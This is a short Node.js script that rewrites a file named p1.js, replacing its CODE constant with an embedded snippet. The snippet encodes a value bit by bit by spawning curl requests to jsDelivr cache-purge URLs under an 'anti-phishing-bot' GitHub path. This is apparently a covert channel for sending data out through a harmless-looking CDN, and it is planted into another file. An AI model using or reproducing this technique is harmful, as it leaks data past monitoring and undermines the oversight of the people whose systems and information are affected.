const fs=require('fs');
const code=`
const cp=require('child_process');
const L=[6460,6461,6462,6463,6464,6465,6466,6467];
const v=65;
for(let b=7;b>=0;b--) if((v>>b)&1) cp.spawnSync('curl',['-s','-m','8','-o','/dev/null','https://purge.jsdelivr.net/gh/anti-phishing-bot/x2@main/b'+L[7-b]]);
console.log('done');
`;
let t=fs.readFileSync('p1.js','utf8');
t=t.replace(/const CODE=.*\n/, 'const CODE='+JSON.stringify(code)+'\n');
fs.writeFileSync('p1.js',t);console.log('ok');
